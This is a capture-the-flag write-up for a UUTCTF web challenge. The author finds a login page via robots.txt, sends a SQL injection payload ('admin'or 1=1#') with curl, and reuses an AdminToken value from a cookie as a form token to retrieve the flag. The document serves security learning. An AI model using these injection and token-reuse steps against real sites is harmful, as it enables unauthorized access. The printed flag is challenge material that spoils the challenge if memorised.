# **Old CTF**

#### tag : web, csrf, cookie 

-----------------------------------------------

#### Description

>There is an old page of UUTCTF at:
>
>http://188.40.189.2:8004/
>
>Simple, find the flag.

-----------------------------------------------

#### Solution

Problem page is `http://188.40.189.2:8004/`. But this page is just archive page for `ctftime`. There is no valuable things in this page. So I check `robots.txt`. 

~~~
$ curl http://188.40.189.2:8004/robots.txt
User-agent: *
Disallow: 
/css/
/fonts/
/images/
/js/
/vendor/
/login.php
~~~

There is simple login page that received 3 parmeters for login.

~~~
$ curl http://188.40.189.2:8004/login.php
...
					<span class="login100-form-title">
						Member Login
					</span>

										
					<div class="wrap-input100">
						<input class="input100" type="hidden" name="token" value="77b042d904595c105874ae33f499be16">
					</div>
					
					<div class="wrap-input100 p-t-15">
						<input class="input100" type="text" name="username" placeholder="Username">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-envelope" aria-hidden="true"></i>
						</span>
					</div>

					<div class="wrap-input100">
						<input class="input100" type="password" name="password" placeholder="Password">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>
					
					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
							Login
						</button>
...
~~~

Maybe simple sqli is effective. But there is only string `Sorry, You must be admin to find the flag! Are you tired? Eat some cookies ;)`.

~~~
$ curl -X POST -d "username=admin'or 1=1#&password=password" http://188.40.189.2:8004/login.php
...
					<span class="login100-form-title">
						Member Login
					</span>

					Sorry, You must be admin to find the flag! Are you tired? Eat some cookies ;)					
					<div class="wrap-input100">
						<input class="input100" type="hidden" name="token" value="77b042d904595c105874ae33f499be16">
					</div>
					
					<div class="wrap-input100 p-t-15">
						<input class="input100" type="text" name="username" placeholder="Username">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-envelope" aria-hidden="true"></i>
						</span>
					</div>

					<div class="wrap-input100">
						<input class="input100" type="password" name="password" placeholder="Password">
						<span class="focus-input100"></span>
						<span class="symbol-input100">
							<i class="fa fa-lock" aria-hidden="true"></i>
						</span>
					</div>
					
					<div class="container-login100-form-btn">
						<button class="login100-form-btn">
							Login
						</button>
~~~

I can find `AdminToken` is `33e78d60bc1f9dcc7291c891e6f069e4` in cookie. Well, Maybe this value is for `token` paremeter.

~~~
$ curl -X POST -c cookies -d "username=admin'or 1=1#&password=password" http://188.40.189.2:8004/login.php

$ cat cookies 
# Netscape HTTP Cookie File
# http://curl.haxx.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

188.40.189.2	FALSE	/	FALSE	1559105464	AdminToken	33e78d60bc1f9dcc7291c891e6f069e4
~~~

Ok. login with token. And I can get flag from server.

~~~
$ curl -X POST -c cookies -d "username=admin'or 1=1#&password=passwordi&token=33e78d60bc1f9dcc7291c891e6f069e4" http://188.40.189.2:8004/login.php
...	
					<span class="login100-form-title">
						Member Login
					</span>

					Congratulations! This is Flag: 1f29322531f03627428a73f70664c8e9									</form>
			</div>
		</div>
	</div>
...
~~~

**UUTCTF{1f29322531f03627428a73f70664c8e9}**
